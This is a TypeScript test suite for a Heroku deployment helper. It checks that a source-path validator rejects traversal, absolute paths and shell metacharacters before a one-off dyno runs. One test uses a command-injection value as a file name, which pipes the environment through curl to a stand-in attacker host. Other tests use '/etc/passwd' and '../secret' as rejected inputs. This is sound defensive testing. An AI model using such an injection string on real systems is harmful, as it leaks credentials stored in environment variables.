import fs from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';
import { expect } from 'chai';
import { Readable } from 'node:stream';
import {
  DeploymentOptions,
  DeployToHeroku,
  isSafeSourceRelativePath,
  MAX_SOURCE_RELATIVE_PATH_LENGTH,
  OneOffDynoConfig
} from './deploy-to-heroku.js';
import AppService from '../services/app-service.js';
import SourceService from '../services/source-service.js';
import AppSetupService from '../services/app-setup-service.js';
import BuildService from '../services/build-service.js';
import sinon from 'sinon';
import * as Heroku from '@heroku-cli/schema';
import { AppSetup, Build } from '@heroku-cli/schema';
import { RendezvousConnection } from '../services/rendezvous.js';
import DynoService from '../services/dyno-service.js';

describe('isSafeSourceRelativePath', () => {
  it('accepts typical virtual paths including optional ./ prefix', () => {
    expect(isSafeSourceRelativePath('app.js')).to.be.true;
    expect(isSafeSourceRelativePath('./app.json')).to.be.true;
    expect(isSafeSourceRelativePath('src/index.js')).to.be.true;
    expect(isSafeSourceRelativePath('.gitignore')).to.be.true;
    expect(isSafeSourceRelativePath('package-lock.json')).to.be.true;
    expect(isSafeSourceRelativePath('lib/nested/file.js')).to.be.true;
  });

  it('rejects traversal, absolute roots, and malformed slashes', () => {
    expect(isSafeSourceRelativePath('..')).to.be.false;
    expect(isSafeSourceRelativePath('../secret')).to.be.false;
    expect(isSafeSourceRelativePath('foo/../bar')).to.be.false;
    expect(isSafeSourceRelativePath('/etc/passwd')).to.be.false;
    expect(isSafeSourceRelativePath('foo//bar')).to.be.false;
    expect(isSafeSourceRelativePath('foo/')).to.be.false;
    expect(isSafeSourceRelativePath('./')).to.be.false;
    expect(isSafeSourceRelativePath('')).to.be.false;
  });

  it('rejects control characters, spaces, and overlong paths', () => {
    expect(isSafeSourceRelativePath('a\nb')).to.be.false;
    expect(isSafeSourceRelativePath('a\rb')).to.be.false;
    expect(isSafeSourceRelativePath('a\0b')).to.be.false;
    expect(isSafeSourceRelativePath('bad path')).to.be.false;
    expect(isSafeSourceRelativePath('a'.repeat(MAX_SOURCE_RELATIVE_PATH_LENGTH + 1))).to.be.false;
    expect(isSafeSourceRelativePath('a'.repeat(MAX_SOURCE_RELATIVE_PATH_LENGTH))).to.be.true;
  });
});

describe('DeployToHeroku', () => {
  // Increase timeout for async tests
  const TEST_TIMEOUT = 30000;
  before(function () {
    this.timeout(TEST_TIMEOUT);
  });

  let tempDir: string;
  let deployToHeroku: DeployToHeroku;
  let appServiceStub: sinon.SinonStubbedInstance<AppService>;
  let sourceServiceStub: sinon.SinonStubbedInstance<SourceService>;
  let appSetupServiceStub: sinon.SinonStubbedInstance<AppSetupService>;
  let buildServiceStub: sinon.SinonStubbedInstance<BuildService>;
  let fetchStub: typeof fetch & sinon.SinonStub;
  let dynoServiceStub: sinon.SinonStubbedInstance<DynoService>;

  beforeEach(async () => {
    // Create a temporary directory for each test
    tempDir = await fs.mkdtemp(path.join(os.tmpdir(), 'deploy-test-'));

    // Create stubs for services
    appServiceStub = sinon.createStubInstance(AppService);
    sourceServiceStub = sinon.createStubInstance(SourceService);
    appSetupServiceStub = sinon.createStubInstance(AppSetupService);
    buildServiceStub = sinon.createStubInstance(BuildService);
    dynoServiceStub = sinon.createStubInstance(DynoService);

    const readable = Readable.from(
      (async function* () {
        yield 'test log output';
      })()
    );

    fetchStub = sinon.stub(globalThis, 'fetch');

    fetchStub
      .withArgs('https://test.com/put', {
        method: 'PUT',
        body: sinon.match.any
      })
      .resolves({ ok: true } as Response);
    fetchStub.withArgs('https://test.com/stream').resolves(new Response(readable));

    deployToHeroku = new DeployToHeroku();
    // Replace service instances with stubs
    Object.assign(deployToHeroku, {
      appService: appServiceStub,
      sourcesService: sourceServiceStub,
      appSetupService: appSetupServiceStub,
      buildService: buildServiceStub,
      dynoService: dynoServiceStub
    });
  });

  afterEach(async () => {
    // Clean up temporary directory after each test
    await fs.rm(tempDir, { recursive: true, force: true });
    sinon.restore();
  });

  async function createTempFile(relativePath: string, content: string | Buffer): Promise<string> {
    const filePath = path.join(tempDir, relativePath);
    await fs.mkdir(path.dirname(filePath), { recursive: true });
    await fs.writeFile(filePath, content);
    return filePath;
  }

  describe('run', () => {
    it('should deploy to existing app when app exists', async function () {
      this.timeout(TEST_TIMEOUT);
      // Create test app.json
      await createTempFile(
        'app.json',
        JSON.stringify({
          name: 'test-app',
          description: 'Test app',
          stack: 'heroku-22'
        })
      );

      const mockApp = { id: 'test-id', name: 'test-app', git_url: 'https://git.heroku.com/test-app.git' };
      const mockBuild: Partial<Build> & { name: string } = {
        id: 'build-id',
        status: 'succeeded',
        output_stream_url: 'https://test.com/stream',
        name: 'test-app'
      };

      appServiceStub.info.resolves(mockApp);
      sourceServiceStub.create.resolves({
        source_blob: {
          get_url: 'https://test.com/get',
          put_url: 'https://test.com/put'
        }
      });
      buildServiceStub.create.resolves(mockBuild as Heroku.Build);
      buildServiceStub.info.resolves({ ...mockBuild, status: 'succeeded' } as Heroku.Build);

      const options: DeploymentOptions = {
        name: 'test-app',
        rootUri: tempDir
      };

      const result = await deployToHeroku.run(options);
      expect(result).to.not.be.null;
      expect(result).to.have.property('name', 'test-app');
      expect(result).to.have.property('status', 'succeeded');
      expect(appServiceStub.info.calledOnce).to.be.true;
      expect(buildServiceStub.create.calledOnce).to.be.true;
    });

    it('should handle invalid app.json', async function () {
      this.timeout(TEST_TIMEOUT);
      // Create invalid app.json
      await createTempFile('app.json', 'invalid json');

      const options: DeploymentOptions = {
        name: 'test-app',
        rootUri: tempDir
      };

      const result = await deployToHeroku.run(options);
      expect(result).to.not.be.null;
      expect(result).to.have.property('errorMessage');
      expect(result!.errorMessage).to.include('Cannot parse');
    });

    it('should handle deployment errors', async function () {
      this.timeout(TEST_TIMEOUT);
      await createTempFile(
        'app.json',
        JSON.stringify({
          name: 'test-app',
          description: 'Test app',
          stack: 'heroku-22'
        })
      );

      appServiceStub.info.rejects(new Error('App not found'));
      sourceServiceStub.create.rejects(new Error('Source creation failed'));

      const options: DeploymentOptions = {
        name: 'test-app',
        rootUri: tempDir
      };

      const result = await deployToHeroku.run(options);
      expect(result).to.not.be.null;
      expect(result).to.have.property('errorMessage').that.includes('Source creation failed');
    });

    it('should handle app setup failure', async function () {
      this.timeout(TEST_TIMEOUT);
      await createTempFile(
        'app.json',
        JSON.stringify({
          name: 'test-app',
          description: 'Test app',
          stack: 'heroku-22'
        })
      );

      const mockAppSetup: AppSetup = {
        id: 'setup-id',
        status: 'failed',
        failure_message: 'Setup failed',
        manifest_errors: ['Error 1', 'Error 2'],
        app: { name: 'test-app', id: 'app-id' }
      };

      appServiceStub.info.rejects(new Error('App not found'));
      sourceServiceStub.create.resolves({
        source_blob: {
          get_url: 'https://test.com/get',
          put_url: 'https://test.com/put'
        }
      });
      appSetupServiceStub.create.resolves(mockAppSetup);
      appSetupServiceStub.info.resolves(mockAppSetup);

      const options: DeploymentOptions = {
        name: 'test-app',
        rootUri: tempDir
      };

      const result = await deployToHeroku.run(options);
      expect(result).to.not.be.null;
      if (result) {
        expect(result.errorMessage).to.include('Setup failed');
        expect(result.errorMessage).to.include('Error 1');
        expect(result.errorMessage).to.include('Error 2');
      }
    });

    it('should deploy a one-off dyno and capture output', async function () {
      this.timeout(TEST_TIMEOUT);
      // Create test app.json
      await createTempFile(
        'app.json',
        JSON.stringify({
          name: 'test-app',
          description: 'Test app',
          stack: 'heroku-22'
        })
      );

      const mockDyno = {
        id: 'dyno-id',
        attach_url: 'https://test.com/attach',
        command: 'echo "Hello, World!"'
      };

      const mockDynoResult = {
        dyno: mockDyno,
        output: 'Hello, World!',
        exitCode: 0,
        name: 'test-app'
      };

      dynoServiceStub.create.resolves(mockDyno);
      const rendezvousStub = sinon.stub(RendezvousConnection.prototype, 'connect').resolves({
        output: 'Hello, World!',
        exitCode: 0
      });

      const options: OneOffDynoConfig = {
        name: 'test-app',
        command: 'echo "Hello, World!"',
        rootUri: tempDir
      };

      const result = await deployToHeroku.run(options);
      expect(result).to.not.be.null;
      expect(result).to.have.property('output', 'Hello, World!');
      expect(result).to.have.property('exitCode', 0);
      expect(dynoServiceStub.create.calledOnce).to.be.true;
      expect(rendezvousStub.calledOnce).to.be.true;
    });

    it('should not create a one-off dyno when a source relativePath contains shell metacharacters', async function () {
      this.timeout(TEST_TIMEOUT);
      await createTempFile(
        'app.json',
        JSON.stringify({
          name: 'test-app',
          description: 'Test app',
          stack: 'heroku-22'
        })
      );

      const mockDyno = {
        id: 'dyno-id',
        attach_url: 'https://test.com/attach',
        command: 'echo done'
      };
      dynoServiceStub.create.resolves(mockDyno);
      sinon.stub(RendezvousConnection.prototype, 'connect').resolves({ output: '', exitCode: 0 });

      const options: OneOffDynoConfig = {
        name: 'test-app',
        command: 'echo done',
        rootUri: tempDir,
        // Bounty-style payload: would break out of `> path` if this string were executed as shell.
        sources: [
          {
            relativePath: 'x; curl https://attacker.example.invalid/?d=$(env|base64) #',
            contents: 'harmless'
          }
        ]
      };

      const result = await deployToHeroku.run(options);
      expect(result).to.not.be.null;
      expect(
        dynoServiceStub.create.called,
        'dynoService.create must not run when relativePath is not a safe virtual path'
      ).to.be.false;
      expect(result).to.have.property('errorMessage');
      expect((result as { errorMessage: string }).errorMessage).to.match(/relativePath|Invalid source/i);
    });

    it('should not create a one-off dyno when a source relativePath uses parent directory segments', async function () {
      this.timeout(TEST_TIMEOUT);
      await createTempFile(
        'app.json',
        JSON.stringify({
          name: 'test-app',
          description: 'Test app',
          stack: 'heroku-22'
        })
      );
      dynoServiceStub.create.resolves({
        id: 'dyno-id',
        attach_url: 'https://test.com/attach',
        command: 'echo done'
      });
      sinon.stub(RendezvousConnection.prototype, 'connect').resolves({ output: '', exitCode: 0 });

      const result = await deployToHeroku.run({
        name: 'test-app',
        command: 'echo done',
        rootUri: tempDir,
        sources: [{ relativePath: 'foo/../bar.js', contents: 'x' }]
      } as OneOffDynoConfig);

      expect(dynoServiceStub.create.called).to.be.false;
      expect(result).to.have.property('errorMessage');
      expect((result as { errorMessage: string }).errorMessage).to.match(/relativePath|Invalid source/i);
    });

    it('should not create a one-off dyno when a source relativePath is absolute', async function () {
      this.timeout(TEST_TIMEOUT);
      await createTempFile(
        'app.json',
        JSON.stringify({
          name: 'test-app',
          description: 'Test app',
          stack: 'heroku-22'
        })
      );
      dynoServiceStub.create.resolves({
        id: 'dyno-id',
        attach_url: 'https://test.com/attach',
        command: 'echo done'
      });
      sinon.stub(RendezvousConnection.prototype, 'connect').resolves({ output: '', exitCode: 0 });

      const result = await deployToHeroku.run({
        name: 'test-app',
        command: 'echo done',
        rootUri: tempDir,
        sources: [{ relativePath: '/tmp/evil.js', contents: 'x' }]
      } as OneOffDynoConfig);

      expect(dynoServiceStub.create.called).to.be.false;
      expect(result).to.have.property('errorMessage');
      expect((result as { errorMessage: string }).errorMessage).to.match(/relativePath|Invalid source/i);
    });

    it('should not create a one-off dyno when a source relativePath has an empty segment', async function () {
      this.timeout(TEST_TIMEOUT);
      await createTempFile(
        'app.json',
        JSON.stringify({
          name: 'test-app',
          description: 'Test app',
          stack: 'heroku-22'
        })
      );
      dynoServiceStub.create.resolves({
        id: 'dyno-id',
        attach_url: 'https://test.com/attach',
        command: 'echo done'
      });
      sinon.stub(RendezvousConnection.prototype, 'connect').resolves({ output: '', exitCode: 0 });

      const result = await deployToHeroku.run({
        name: 'test-app',
        command: 'echo done',
        rootUri: tempDir,
        sources: [{ relativePath: 'src//index.js', contents: 'x' }]
      } as OneOffDynoConfig);

      expect(dynoServiceStub.create.called).to.be.false;
      expect(result).to.have.property('errorMessage');
      expect((result as { errorMessage: string }).errorMessage).to.match(/relativePath|Invalid source/i);
    });

    it('should create a one-off dyno when sources use only safe virtual paths', async function () {
      this.timeout(TEST_TIMEOUT);
      await createTempFile(
        'app.json',
        JSON.stringify({
          name: 'test-app',
          description: 'Test app',
          stack: 'heroku-22'
        })
      );

      const mockDyno = {
        id: 'dyno-id',
        attach_url: 'https://test.com/attach',
        command: 'echo done'
      };
      dynoServiceStub.create.resolves(mockDyno);
      sinon.stub(RendezvousConnection.prototype, 'connect').resolves({ output: 'ok', exitCode: 0 });

      const options: OneOffDynoConfig = {
        name: 'test-app',
        command: 'echo done',
        rootUri: tempDir,
        sources: [{ relativePath: 'app.js', contents: 'console.log(1)' }]
      };

      const result = await deployToHeroku.run(options);
      expect(result).to.not.be.null;
      expect(dynoServiceStub.create.calledOnce).to.be.true;
      expect(result).to.have.property('exitCode', 0);
    });
  });
});
